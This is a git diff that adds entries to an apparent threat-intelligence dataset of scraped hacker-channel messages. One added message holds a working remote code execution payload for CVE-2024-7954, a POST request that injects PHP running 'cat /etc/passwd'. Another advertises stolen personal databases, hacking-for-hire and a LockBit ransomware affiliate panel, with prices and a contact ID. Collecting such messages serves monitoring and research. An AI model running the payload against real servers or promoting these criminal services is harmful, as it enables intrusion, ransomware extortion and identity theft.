@@ -7688,6 +7688,16 @@
                 "N/A"
             ],
             "URLs": []
+        },
+        {
+            "Message ID": 1934,
+            "Date": "2024-09-08",
+            "Content": "CVE-2024-7954\n\nPOST /index.php?action=porte_plume_previsu HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\ndata=AA_[<img111111>->URL<?php system('cat /etc/passwd'); ?>]_BB\n\ncat /etc/passwd\n\n#exploit #poc",
+            "Attack Type": "Unknown",
+            "Location": [
+                "N/A"
+            ],
+            "URLs": []
         }
     ],
     "Anonymous Chat": [
@@ -28116,6 +28126,36 @@
             "URLs": [
                 "tri-tech.us"
             ]
+        },
+        {
+            "Message ID": 25144,
+            "Date": "2024-09-08",
+            "Content": "🌎WORLD DATABASE VIP CHANNEL🌎\n\nyou can adjust the price, There are lots of databases there from various industries, whether it's overseas, employment, banking, political information, intelligence information, secret agents, online shop information, information Sales, electronics, passports information, prison detainee information, terrorist information, personal information of citizens from various countries,\nFull SSN Drivers information, any information is on our VIP channel \n\n🥷Regarding the files and the number of databases, it is very large, it cannot be counted because on our VIP channel there are so many and the database is mixed up with old and new information.\n\n🥷However, we have updated this VIP channel and every day we update the latest information for 2024\n\n🥷Join and use the VIP service for life so you can get our blog link as well as our hacking service In particular\n\n🥷our ~ VIP channel for now you can check. If you are a VIP user, enjoy all the information on our VIP channel specifically>\n\n🥷and we advise you not to spread information on VIP channels.\n\n🥷because it is strictly prohibited..\n\n🥷For those who want to join, please register yourself.\n\n🥷Come join our VIP channel. The price you just have to choose is below:\n3 months price 250$\n6 months price 350$\n9 months price 450$\nLifetime price 500$\n\n\nHacking Services, Lockbit Ransomware panel 3.0 New variant, you can contact us with the aim of joining our affiliate paying Btc for it. when I give you panel\nyou can take any build from malware                                                               bazaar\nand give me ID\nI will give you decryptor\nit's proof I am admin\n\n\nPrice hacking services:\nFor 1 week 1000$\nFor 2 weeks 2000$\nFor 3 Weeks 3000$\nFor 1 month 10.000$\n\nto rent, Ransomware panel price\n1 BTC  Equivalent to a price of $60,000\n\nto join our team is free! Only testing costs money. For a Ransomware panel we do not misuse.\n\n\nAnd we will teach you various secret codes and techniques, regarding infiltration, attacks, and several other attack techniques related to the system...\n\n\n🥷contact us:\n\n⚡️TOX ID SUPPORT 022A7EEB83B648F55DA7A6BEFD130C2156C74F3501A31D853234EC2D18E77A1EA9FCE8BF45DE\n\n✋ @LockBitSuppRaas\n✋ Database Channel",
+            "Attack Type": "Hacking",
+            "Location": [
+                "🥷and"
+            ],
+            "URLs": []
+        },
+        {
+            "Message ID": 25143,
+            "Date": "2024-09-08",
+            "Content": "",
+            "Attack Type": "Unknown",
+            "Location": [
+                "N/A"
+            ],
+            "URLs": []
+        },
+        {
+            "Message ID": 25142,
+            "Date": "2024-09-08",
+            "Content": "",
+            "Attack Type": "Unknown",
+            "Location": [
+                "N/A"
+            ],
+            "URLs": []
         }
     ]
 }
